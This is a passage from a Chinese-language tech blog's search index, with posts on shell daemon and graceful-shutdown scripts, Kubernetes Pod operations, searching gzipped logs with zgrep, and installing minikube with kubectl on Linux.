以下參考springboot 打包（jar）部署在 Linux 環境 - SegmentFault 思否 這個應該也能改成一般程式執行 注意!!這邊不是無限loop 估記是Java 程式做 loop #!/bin/bash AppName=ruoyi.jar #JVM參數 JVM_OPTS=\"-Dname=$AppName -Duser.timezone=Asia/Shanghai -Xms512M -Xmx512M -XX:PermSize=256M -XX:MaxPermSize=512M -XX:+HeapDumpOnOutOfMemoryError -XX:+PrintGCDateStamps -XX:+PrintGCDetails -XX:NewRatio=1 -XX:SurvivorRatio=30 -XX:+UseParallelGC -XX:+UseParallelOldGC\" APP_HOME=`pwd` LOG_PATH=$APP_HOME/logs/$AppName.log if [ \"$1\" = \"\" ]; then echo -e \"\\033[0;31m 未輸入操作名 \\033[0m \\033[0;34m {start|stop|restart|status} \\033[0m\" exit 1 fi if [ \"$AppName\" = \"\" ]; then echo -e \"\\033[0;31m 未輸入應用名 \\033[0m\" exit 1 fi function start() { PID=`ps -ef |grep java|grep $AppName|grep -v grep|awk '{print $2}'` if [ x\"$PID\" != x\"\" ]; then echo \"$AppName is running...\" else nohup java -jar $JVM_OPTS target/$AppName \u003e /dev/null 2\u003e\u00261 \u0026 echo \"Start $AppName success...\" fi } function stop() { echo \"Stop $AppName\" PID=\"\" query(){ PID=`ps -ef |grep java|grep $AppName|grep -v grep|awk '{print $2}'` } query if [ x\"$PID\" != x\"\" ]; then kill -TERM $PID echo \"$AppName (pid:$PID) exiting...\" while [ x\"$PID\" != x\"\" ] do sleep 1 query done echo \"$AppName exited.\" else echo \"$AppName already stopped.\" fi } function restart() { stop sleep 2 start } function status() { PID=`ps -ef |grep java|grep $AppName|grep -v grep|wc -l` if [ $PID != 0 ];then echo \"$AppName is running...\" else echo \"$AppName is not running...\" fi } case $1 in start) start;; stop) stop;; restart) restart;; status) status;; *) esac 另外一種 看試強制關閉 #!/bin/sh JAR_NAME=ruoyi.jar tpid=`ps -ef|grep $JAR_NAME|grep -v grep|grep -v kill|awk '{print $2}'` if [ ${tpid} ]; then echo 'Stop Process...' fi sleep 5 tpid=`ps -ef|grep $JAR_NAME|grep -v grep|grep -v kill|awk '{print $2}'` if [ ${tpid} ]; then echo 'Kill Process!' kill -9 $tpid else echo 'Stop Success!' fi tpid=`ps -ef|grep $JAR_NAME|grep -v grep|grep -v kill|awk '{print $2}'` if [ ${tpid} ]; then echo 'App is running.' else echo 'App is NOT running.' fi rm -f tpid nohup java -jar ./$JAR_NAME \u003e/dev/null 2\u003e\u00261 \u0026 echo $! \u003e tpid echo 'Start Success!' 這個應該可以改成一般非 Java 程式排程 再搭配關閉訊號控制程式，是不是就是完美關閉腳本 好吧，其實我還是覺得 Systemd 才是最佳解決方案 ","date":"2021-01-28","objectID":"/blog/posts/Shell-%E5%AF%A6%E4%BD%9C%E5%AE%88%E8%AD%B7%E9%80%B2%E7%A8%8B%E6%96%B9%E6%B3%95/:2:0","tags":["shell"],"title":"Shell 實作守護進程方法","uri":"/blog/posts/Shell-%E5%AF%A6%E4%BD%9C%E5%AE%88%E8%AD%B7%E9%80%B2%E7%A8%8B%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"關閉訊號控制程式 最近有看到可以傳送關閉訊號控制程式跑完進程關閉程式 #!/bin/bash mp3convert () { echo \"mp3convert...\"; sleep 5; echo \"mp3convert done...\" } PreTrap() { echo \"in trap\" QUIT=1 echo \"exiting trap...\" } CleanUp() { ### Since 'wait $PID' can be interrupted by ^C, we need to protected it ### by the 'kill' loop ==\u003e double/triple control-C problem. while kill -0 $PID \u003e\u0026 /dev/null; do wait $PID; echo \"check again\"; done ### This won't work (A simple wait $PID is vulnerable to double control C) # wait $PID if [ ! -z $QUIT ]; then echo \"clean up...\" exit fi } trap PreTrap SIGINT SIGTERM SIGTSTP #trap CleanUp EXIT for loop in 1 2 3; do ( echo \"loop #$loop\" mp3convert echo magic 1 echo magic 2 echo magic 3 ) \u0026 PID=$! CleanUp echo \"done loop #$loop\" done 測試結果，還真的有用 開兩個 cmd ，一個執行，另一個kill 並不會直接結束 參考:shell - bash trap interrupt command but should exit on end of loop - Stack Overflow trap 相關指令，可以用來可以控制關閉方法 优雅地结束docker容器的init bash脚本 shell-trap | 平凡備忘錄 Bash 程式設計教學：平行執行背景子行程，用 wait 等待工作結束 - G. T. Wang ","date":"2021-01-28","objectID":"/blog/posts/Shell-%E5%AF%A6%E4%BD%9C%E5%AE%88%E8%AD%B7%E9%80%B2%E7%A8%8B%E6%96%B9%E6%B3%95/:3:0","tags":["shell"],"title":"Shell 實作守護進程方法","uri":"/blog/posts/Shell-%E5%AF%A6%E4%BD%9C%E5%AE%88%E8%AD%B7%E9%80%B2%E7%A8%8B%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"調整完美關閉腳本 TODO: 待修改 彩蛋 執行 Docker 容器可使用 dumb-init 或 tini 改善程序優雅結束的問題 | The Will Will Web ","date":"2021-01-28","objectID":"/blog/posts/Shell-%E5%AF%A6%E4%BD%9C%E5%AE%88%E8%AD%B7%E9%80%B2%E7%A8%8B%E6%96%B9%E6%B3%95/:4:0","tags":["shell"],"title":"Shell 實作守護進程方法","uri":"/blog/posts/Shell-%E5%AF%A6%E4%BD%9C%E5%AE%88%E8%AD%B7%E9%80%B2%E7%A8%8B%E6%96%B9%E6%B3%95/"},{"categories":["Kubernetes"],"content":"記錄 使用前建議使用Install and Set Up kubectl | Kubernetes 方便操作指令使用 ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:0:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"小記知識 K8s 最小運算單原，一個 Pod 可以跑多個 Container。 Pod Pod Controllers 一個 Pod 可以共享的有 網路( IP Address, Port , routing system) 儲存(可以選擇相同儲存空間) IPC(Inter Process Communication) 05:08 補圖(相同網路，內部是127.0.0.1) Container 狀態 Running Terminated 執行完成(成功或失敗) Waiting 還沒跑起來 Pod 狀態 Pending 還沒有起來 Running 程式運行中 Successed 執行成功 Failed 執行失敗 Unknown Pods 重啟機制 Never Always 總是重啟 OnFailure 失敗重啟 Node Affinity 靠近 Node taints 遠離 Control Plane 不能部屬 Pod (No Schedule) kubeadm 預設情況下不能部屬 Pod 在 Control Plane 可以設定標籤(Label,NodeSelector) ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:1:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"建立 Pod(Imperative Commands) Imperative Commands 通常測試開發才會使用。正式部屬不建議這樣使用。 kubectl run kuard --generator=run-pod/v1 --image=gcr.io/kuar-demo/kuard-amd64:blue # Flag --generator has been deprecated, has no effect and will be removed in the future. kubectl常用命令 | 好好学习的郝 kubectl –generator 参数被弃用问题解决_沧夜-CSDN博客 kubectl 的用法约定 | Kubernetes 啟動完會看到 pods 有成功 kubectl get pods # NAME READY STATUS RESTARTS AGE # kuard 1/1 Running 0 12s ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:2:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"運行 Pod kubectl apply -f kuard-pod.yaml ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:3:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"移除 Pod # 使用 kubectl delete pods kuard # 刪除 pods kubectl delete -f kuard-pod.yaml ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:4:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"轉發 port # 本地轉發 kubectl port-forward kuard 8080:8080 # Forwarding from 127.0.0.1:8080 -\u003e 8080 # Forwarding from [::1]:8080 -\u003e 8080 # 對外來原 IP 轉發 kubectl port-forward kuard 8080:8080 --address 0.0.0.0 # Forwarding from 0.0.0.0:8080 -\u003e 8080 更多可參考kubectl Port-Forward - Kubernetes Port Forwarding Guide http://IP:8080 就能訪問環境頁面 ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:5:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"查看 log kubectl logs kuard ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:6:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"exec 執行程式 kubectl exec kuard ifconfig kubectl exec kuard ip a 跟 docker 操作方式差不多 我注意到kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead. kubectl exec kuard -- ls -l ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:7:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"容器複製檔案 kubectl cp \u003cfile-spec-src\u003e \u003cfile-spec-dest\u003e Kubectl Reference Docs 使用中有看到錯誤 kubectl cp kuard:/kuard ./kuard  ✔  26  23:09:09 # tar: removing leading '/' from member names ls # kuard 有看到tar錯誤，後來 ls 有看到檔案 修復kubectl cp出現tar: Removing leading `/’ from member names - 雲+社區 - 騰訊雲 Kubectl cp gives “tar: removing leading ‘/’ from member names” warning · Issue #58692 · kubernetes/kubernetes 原來是 bug … ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:8:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"健康檢查 apiVersion: v1 kind: Pod metadata: labels: test: liveness name: liveness-exec spec: containers: - name: liveness image: k8s.gcr.io/busybox args: - /bin/sh - -c - touch /tmp/healthy; sleep 30; rm -rf /tmp/healthy; sleep 600 livenessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 5 # initialDelaySeconds 字段告訴 kubelet 在執行第一次探測前應該等待 5 秒 periodSeconds: 5 # periodSeconds 字段指定了 kubelet 應該每 5 秒執行一次存活探測 在這個配置文件中，可以看到 Pod 中只有一個容器。 periodSeconds 字段指定了 kubelet 應該每 5 秒執行一次存活探測。 initialDelaySeconds 字段告訴 kubelet 在執行第一次探測前應該等待 5 秒。 kubelet 在容器內執行命令 cat /tmp/healthy 來進行探測。 如果命令執行成功並且返回值為 0，kubelet 就會認為這個容器是健康存活的。 如果這個命令返回非 0 值，kubelet 會殺死這個容器並重新啟動它。 有兩種 Liveness, Readiness 上面是配置存活、就绪和启动探测器 | Kubernetes範例 kubectl apply -f https://k8s.io/examples/pods/probe/exec-liveness.yaml liveness,readiness 後面會在做整理 如果使用 Liveness Probe，當錯誤發生時 (無回應或回應錯誤)，k8s 會嘗試重新建立 (kill then create) 一個新的容器。 如果使用 Readiness Probe，當錯誤發生時，對應的 Service 物件就會將該容器標示為不可使用，所以任何的需求都不會導向該容器。 可先看Day 24 - 常見問題與建議 (5) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 Liveness Probe 啟動時候，web 可能會有延連時間。例如有些程式啟動不可能馬上出現內容 這時候 initialDelaySeconds 設定就很重要 Readiness Prob 啟動時候，Service 會算到 Pod 可用，會把當下 Container IP 加到 Service。 配置 Pod 的 liveness 和 readiness 探針 ‧ Kubernetes Handbook - Kubernetes中文指南/雲原生應用架構實踐手冊 by Jimmy Song(宋淨超) ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:9:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"資源限制 ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:10:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Request,Limit 为容器和 Pods 分配 CPU 资源 | Kubernetes Minikube需要安裝 metrics-server minikube addons enable metrics-server kubectl get apiservices # NAME # v1beta1.metrics.k8s.io 創建一個 namespace kubectl create namespace cpu-example apiVersion: v1 kind: Pod metadata: name: cpu-demo namespace: cpu-example spec: containers: - name: cpu-demo-ctr image: vish/stress resources: limits: cpu: \"1\" requests: cpu: \"0.5\" args: - -cpus - \"2\" kubectl apply -f https://k8s.io/examples/pods/resource/cpu-request-limit.yaml --namespace=cpu-example kubectl get pod cpu-demo --namespace=cpu-example # 可以看到 limit 有限制 # 輸出顯示 Pod 中的一個容器的 CPU 請求為 500 milli CPU，並且 CPU 限制為 1 個 CPU。 # resources: # limits: # cpu: \"1\" # requests: # cpu: 500m NAME CPU(cores) MEMORY(bytes) cpu-demo 1006m 2Mi kubectl delete namespace cpu-example ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:10:1","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Volumes Volumes | Kubernetes ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:11:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"其他 相關 YAML API 文件 Kubernetes API Reference Docs ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:12:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"taint # 看Taints: 狀態 kubectl describe # 移掉 noschedule 狀態(可以在 Control Pane 操作) kubectl taint node k8s-dev node-role.kubernetes.io/master:NoSchedule- ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:13:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"建立 Pod(Imperative Object) 使用 Yaml或 JSON 格式寫設定。 https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.22/ kubectl create -f xxxx.yml kubectl edit pod xxxx # 手動更改 yaml # (覆蓋檔案會友先前檔案執行的yaml不一致，，不實用) kubectl replace -f xxxx.yml kubectl get pod xxxx -o yaml \u003e new.yml # 修改 new.yml kubectl replace -f xxxx.yml ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:14:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"建立 Pod(Declarative Object) 前面提到 Imperative Object kubectl replace 會有當下資源不一致，原因kubectl create 不會計紀錄，但是kubectl apply 會記錄你每次傳指令yaml檔案內容，所以kubectl apply 不會有像 replace 一樣問題。 所以釐清kubectl apply 和 kubectl create 還是有差異的，書中提到用 kubectl apply就對了XD ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:15:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Pod \u0026 Pause Container 基於 network namespace 實作網路隔離化 kubeadm 我發現 container 控制元件都是使用 host network namespace，所以跟主機IP一樣 Pod 所有container 都是使用第一個建立 container，docker實作如下。 docker run -d --name=ubuntu1 dersimn/netutils tail -f /dev/null docker run -d --name=ubuntu2 --net=container:ubuntu1 dersimn/netutils tail -f /dev/null ## 下面兩個指令你會看到 IP 都相等 docker exec ubuntu1 ifconfig docker exec ubuntu2 ifconfig # eth0: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 # inet 172.18.0.2 netmask 255.255.0.0 broadcast 172.18.255.255 # ether 02:42:ac:12:00:02 txqueuelen 0 (Ethernet) # RX packets 9 bytes 1046 (1.0 KB) # RX errors 0 dropped 0 overruns 0 frame 0 # TX packets 0 bytes 0 (0.0 B) # TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 # lo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e mtu 65536 # inet 127.0.0.1 netmask 255.0.0.0 # loop txqueuelen 1000 (Local Loopback) # RX packets 0 bytes 0 (0.0 B) # RX errors 0 dropped 0 overruns 0 frame 0 # TX packets 0 bytes 0 (0.0 B) # TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 # ubuntu1 刪掉 container ，ubuntu2 也會連帶刪除 docker rm -f ubuntu1 docker exec ubuntu2 ifconfig # lo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e mtu 65536 # inet 127.0.0.1 netmask 255.0.0.0 # loop txqueuelen 1000 (Local Loopback) # RX packets 0 bytes 0 (0.0 B) # RX errors 0 dropped 0 overruns 0 frame 0 # TX packets 0 bytes 0 (0.0 B) # TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 # 獨立 ip docker run -d --name=ubuntu3 --net=host dersimn/netutils 也可用hwchiu/netutils: Docker image contains useful network tools 簡短的說，Container網路共用同網卡問題，砍掉1，2就會看不到。 這邊你看到刪除container1 後 container2 IP就會不見，依照這個狀況下，K8S網路連線這是一個很大問題，所以使用Pause Container。 Pause Container Pod 起來就會背景睡眠，CNI會掛載到Pause Container 讓你container 1 掛掉不會影響其他 container 2 網路 ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:16:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Workload/Pod Controller ReplicaSet Deployment Daemonset StatefulSet Job CronJob ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:17:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"ReplicaSet Kubernetes 的 ReplicaSet ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:17:1","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"kubectl plugin kubectl 可以放置應用程式在usr/local/bin放置kubectl-*，這邊用 ls 看例子。 例如 放置 /usr/local/bin/kubectl-xxxx 可執行 kubectl xxxx sudo cp /bin/ls /usr/local/bin/ kubectl ls # 顯示當前路徑 ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:18:0","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"安裝 krew 安裝 Git 執行 Installing · Krew裡面指令 加入 krew 還境變數 重啟 bash/zsh Krew 管理 Plugin 套件 kubectl krew install tree kubectl tree -n kube-system ds kindnet # NAMESPACE NAME READY REASON AGE # kube-system DaemonSet/kindnet - 14d # kube-system ├─ControllerRevision/kindnet-5b547684d9 - 14d # kube-system ├─Pod/kindnet-74l9s True 14d # kube-system ├─Pod/kindnet-kcwbr True 14d # kube-system └─Pod/kindnet-zrzkp True 14d ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:18:1","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Deployment Kubernetes 的 Deployment ","date":"2021-01-19","objectID":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/:18:2","tags":["pod"],"title":"Kubernetes 操作 Pod 小記","uri":"/blog/posts/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"常常要抓下來再解縮查詢 這樣常常花了滿多時間 gunzip -c mygzfile.gz | grep \"string to be searched\" # 推薦使用這個，想看到哪一個檔案比較方便 zgrep \"pattern\" file.gz zgrep \"power\" messages.*.gz 參考來源: linux - how to search for a particular string from a .gz file? - Stack Overflow 不過還是建議大檔案不要用這種方式查詢 還不確定會不會造成什麼不良影響 彩蛋 有空實作: cron - Configuring logrotate without root access (per user log rotation) - Ask Ubuntu Docker安全自动化扫描工具对比测试 - 程序员大本营 如何优雅的在 Docker 容器中指定用户及组权限的三种方式 - 奇妙的 Linux 世界 ","date":"2021-01-17","objectID":"/blog/posts/%E6%9F%A5%E8%A9%A2%E6%9C%89%E5%A3%93%E7%B8%AE-gz-%E6%97%A5%E8%AA%8C-log-%E6%96%B9%E6%B3%95/:0:0","tags":["gz","log"],"title":"查詢有壓縮(gz)日誌 log 方法","uri":"/blog/posts/%E6%9F%A5%E8%A9%A2%E6%9C%89%E5%A3%93%E7%B8%AE-gz-%E6%97%A5%E8%AA%8C-log-%E6%96%B9%E6%B3%95/"},{"categories":["Kubernetes"],"content":"minkube ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:1:0","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"安裝 minikube 必備安裝 VirtualBox minikube kubectl Minikube (這邊請去官網看OS載點替換) kubernetes/minikube curl -LO https://github.com/kubernetes/minikube/releases/download/v1.6.2/minikube-linux-amd64(這邊請去官網看OS載點替換) chmod +x minikube-linux-amd64 ./minikube-linux-amd64 # 測試看能不跑 sudo mv minikube-linux-amd64 /usr/local/bin/minikube Virtualbox Linux_Downloads – Oracle VM VirtualBox 我這邊是用 ElementaryOS (Ubuntu 18.04) 下載完成用 sudo apt install ./xxx.deb 指令安裝 安裝 kubectl 單節點 (這邊請去官網看OS載點替換) Install and Set Up kubectl - Kubernetes 這邊我選 Linux curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl (這邊請去官網看OS載點替換) chmod +x ./kubectl sudo mv ./kubectl /usr/local/bin/kubectl kubectl # 看能不能跑 minikube start minikube start # 會安裝會用到的 iso 😄 minikube v1.6.2 on Debian buster/sid ✨ Automatically selected the 'virtualbox' driver (alternates: [none]) 🔥 Creating virtualbox VM (CPUs=2, Memory=2000MB, Disk=20000MB) ... 🐳 Preparing Kubernetes v1.17.0 on Docker '19.03.5' ... 🚜 Pulling images ... 🚀 Launching Kubernetes ... ⌛ Waiting for cluster to come online ... 🏄 Done! kubectl is now configured to use \"minikube\" 最後可以下minikube dashboard 看有沒有問題 minikube start 選項功能(沒用 vagrant 可以跳過) --vm-drivers(default 是Virtualbox) none 是用本機 --Bootstrapper(預設使用kubeadm) 在 vagrant 安裝 minikube 可以做sudo minikube start --vm-drivers=none ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:1:1","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"遇到錯誤 VM 64 bit 不能安裝 64 bit OS 先說結論:不能用 VM 跑樣子 用 VM 裝可能遇到的問題 💣 Unable to start VM. Please investigate and run 'minikube delete' if possible ❌ Error: [VBOX_VTX_DISABLED] create: precreate: This computer doesn't have VT-X/AMD-v enabled. Enabling it in the BIOS is mandatory config.vm.provider :virtualbox do |vb| vb.customize [\"modifyvm\", :id, \"--hwvirtex\", \"off\"] end 參考來源: Disable VT-X in Vagrantfile 但最後還是不行 Consequences from missing VT-X in nested VirtualBox There are currently two consequences from nesting without VT-X: You cannot use multiple CPUs but you can use a single virtual cpu using vb.cpus = 1 You cannot run a 64-Bit VM within a nested VirtualBox. Error VT-x not available for Vagrant machine inside Virtualbox - Stack Overflow Exec format error 若有這個錯誤訊息… bash: /usr/local/bin/kubectl: cannot execute binary file: Exec format error 就是安裝錯版本 ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:1:2","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"修改權限 sudo chown `id -u`:`id -u` -R .minikube/ ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:1:3","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"使用 minikube 的 kubectl sudo minikube kubectl minikube kubectl -- -n kube-system get pods ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:1:4","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"查看 cluster-info 資訊 sudo minIkube kubectl -- cluster-info 或 kubectl cluster-info Kubernetes control plane is running at https://192.168.99.100:8443 KubeDNS is running at https://192.168.99.100:8443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy 成功完成 用 vagrant 安裝可能會遇到權限問題可以使用問題，如下圖。 加上sudo可以解決。 權限問題(使用vagrant) 因為用 sudo安裝關係，設定檔有些是 root，照minikube start跑完上面設定有叫你下那些指令後，就可以正常使用。 #主要是第二段 sudo mv /home/vagrant/.kube /home/vagrant/.minikube $HOME sudo chown -R $USER $HOME/.kube $HOME/.minikube ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:1:5","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"查看 minikube 的原件 這邊可以看到他跟預設 k8s 安裝原件有差異，所以滿多人不建義用這個玩k8s。 多了Storage Provisioner，少了Flannel CNI。 ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:1:6","tags":["kubernetes"],"title":"安裝 Minikube 